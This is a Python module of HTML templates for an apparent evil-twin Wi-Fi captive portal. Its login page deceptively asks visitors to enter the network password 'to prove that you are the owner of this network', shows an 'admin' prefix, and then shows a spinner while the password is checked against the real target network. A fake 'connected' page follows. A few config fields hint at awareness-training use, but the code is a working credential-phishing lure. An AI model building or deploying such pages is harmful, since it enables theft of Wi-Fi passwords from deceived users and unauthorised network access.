"""HTML templates for the captive portal (employee-facing pages)."""

from __future__ import annotations

import html
from typing import Any


def _e(value: str) -> str:
    return html.escape(value or "", quote=True)


def _classic_shell(*, title: str, body: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>{_e(title)}</title>
  <style>
    * {{ box-sizing: border-box; }}
    body {{
      margin: 0;
      min-height: 100vh;
      background: #e8e8e8;
      color: #000;
      font-family: Tahoma, Verdana, sans-serif;
      font-size: 15px;
      padding: 16px;
    }}
    .wrap {{
      width: 100%;
      max-width: 480px;
      margin: 24px auto 0;
      border: 1px solid #999;
      background: #fff;
    }}
    .hd {{
      background: #d4d0c8;
      border-bottom: 1px solid #999;
      padding: 10px 14px;
      font-weight: bold;
      font-size: 16px;
    }}
    .bd {{ padding: 18px 14px 20px; }}
    .actions {{ text-align: right; margin-top: 16px; }}
    input[type=submit], button {{
      min-width: 96px;
      min-height: 40px;
      padding: 8px 16px;
      font-family: Tahoma, Verdana, sans-serif;
      font-size: 15px;
      border: 1px solid #003c74;
      background: #ece9d8;
      cursor: pointer;
    }}
    .spinner {{
      width: 36px;
      height: 36px;
      border: 4px solid #ccc;
      border-top-color: #003c74;
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin: 12px auto 16px;
    }}
    @keyframes spin {{
      to {{ transform: rotate(360deg); }}
    }}
    .error {{ color: #a00; font-weight: bold; }}
    .ssid {{
      text-align: center;
      font-size: 18px;
      font-weight: bold;
      margin: 4px 0 18px;
      line-height: 1.3;
      word-break: break-word;
    }}
    .note {{ color: #333; margin: 0 0 16px; line-height: 1.5; }}
    h1 {{ margin: 0 0 10px; font-size: 18px; font-weight: bold; }}
    p {{ margin: 8px 0; line-height: 1.5; }}
    .field-row {{
      display: flex;
      align-items: center;
      gap: 10px;
      width: 100%;
    }}
    .field-row .prefix {{
      flex: 0 0 auto;
      font-weight: bold;
      color: #222;
      font-size: 15px;
    }}
    .field-row input[type=password] {{
      flex: 1 1 auto;
      width: 100%;
      min-width: 0;
      min-height: 40px;
      padding: 8px 10px;
      border: 1px solid #7f9db9;
      font-family: Tahoma, Verdana, sans-serif;
      font-size: 16px;
    }}
    @media (min-width: 768px) {{
      body {{ font-size: 14px; padding: 32px 24px; }}
      .wrap {{
        max-width: 520px;
        margin-top: 64px;
      }}
      .hd {{ font-size: 15px; padding: 10px 16px; }}
      .bd {{ padding: 22px 18px 24px; }}
    }}
    @media (max-width: 480px) {{
      body {{ padding: 10px; }}
      .wrap {{ margin-top: 12px; }}
      .actions {{ text-align: stretch; }}
      .actions input[type=submit], .actions button {{
        width: 100%;
      }}
    }}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="hd">{_e(title)}</div>
    <div class="bd">
{body}
    </div>
  </div>
</body>
</html>
"""


def _ssid_block(ssid: str) -> str:
    if not ssid:
        return ""
    return f'<p class="ssid">{_e(ssid)}</p>'


def landing_page(*, ssid: str, title: str, organization: str, training_message: str, contact: str) -> str:
    """Fallback page when the password sign-in form is disabled."""
    _ = organization
    msg = f"<p>{_e(training_message)}</p>" if training_message else ""
    contact_html = f"<p>Contact: {_e(contact)}</p>" if contact else ""
    body = f"""      {_ssid_block(ssid)}
      {msg}
      {contact_html}
      <form method="post" action="/interact">
        <input type="hidden" name="action" value="continue"/>
        <div class="actions"><input type="submit" value="Continue"/></div>
      </form>"""
    return _classic_shell(title=title, body=body)


def login_page(
    *,
    ssid: str,
    title: str,
    organization: str,
    password_label: str = "Password",
    button_label: str = "Connect",
) -> str:
    """Classic password-only captive-portal sign-in page. Form posts to /login."""
    _ = organization
    # password_label is unused on purpose: the field shows a fixed "admin" prefix.
    _ = password_label
    body = f"""      {_ssid_block(ssid)}
      <p class="note">Security procedure: you must enter the password to prove that you are the owner of this network.</p>
      <form method="post" action="/login" autocomplete="off">
        <div class="field-row">
          <span class="prefix">admin</span>
          <input id="p" name="password" type="password" autocomplete="off" autofocus aria-label="Password"/>
        </div>
        <div class="actions">
          <input type="submit" value="{_e(button_label)}"/>
        </div>
      </form>"""
    return _classic_shell(title=title, body=body)


def spinner_page(*, title: str) -> str:
    """Shown while the submitted password is verified against the target network."""
    body = """      <div class="spinner" aria-hidden="true"></div>
      <p class="note" style="text-align:center">Verifying your credentials…</p>
      <p style="text-align:center;color:#666;font-size:13px">Please wait.</p>
      <script>
        (function poll() {
          fetch("/login/result", { credentials: "same-origin", cache: "no-store" })
            .then(function(r) { return r.text(); })
            .then(function(html) {
              if (html.indexOf("data-figo-pending") >= 0) {
                setTimeout(poll, 500);
                return;
              }
              document.open();
              document.write(html);
              document.close();
            })
            .catch(function() { setTimeout(poll, 800); });
        })();
      </script>"""
    return _classic_shell(title=title, body=body)


def wrong_password_page(
    *,
    ssid: str,
    title: str,
    organization: str,
    button_label: str = "Connect",
) -> str:
    """Shown when the submitted password does not match the real network."""
    _ = organization
    body = f"""      {_ssid_block(ssid)}
      <p class="error" style="text-align:center">Incorrect password. Please try again.</p>
      <form method="post" action="/login" autocomplete="off">
        <div class="field-row">
          <span class="prefix">admin</span>
          <input id="p" name="password" type="password" autocomplete="off" autofocus aria-label="Password"/>
        </div>
        <div class="actions">
          <input type="submit" value="{_e(button_label)}"/>
        </div>
      </form>"""
    return _classic_shell(title=title, body=body)


def connected_page(*, ssid: str, title: str, organization: str) -> str:
    """Classic captive-portal connected confirmation shown after sign-in."""
    _ = organization
    body = f"""      {_ssid_block(ssid)}
      <h1 style="text-align:center">Verified — you are connected</h1>
      <p style="text-align:center">Your credentials were confirmed and your device now has network access.</p>
      <p style="text-align:center">You can return to your browser and continue.</p>"""
    return _classic_shell(title=title, body=body)


def render_context(config: Any) -> dict[str, Any]:
    portal = getattr(config, "portal", None)
    return {
        "ssid": getattr(config, "effective_ssid", lambda: "")()
        if callable(getattr(config, "effective_ssid", None))
        else getattr(config, "target_ssid", ""),
        "title": getattr(portal, "portal_title", "Wi-Fi Authentication") if portal else "Wi-Fi Authentication",
        "organization": getattr(portal, "organization", "") if portal else "",
        "training_message": getattr(portal, "training_message", "") if portal else "",
        "contact": getattr(portal, "security_contact", "") if portal else "",
        "require_login": bool(getattr(portal, "require_login", True)) if portal else True,
        "password_label": getattr(portal, "login_password_label", "Password") if portal else "Password",
        "button_label": getattr(portal, "login_button_label", "Connect") if portal else "Connect",
        "verify_target_password": bool(getattr(portal, "verify_target_password", True)) if portal else True,
    }
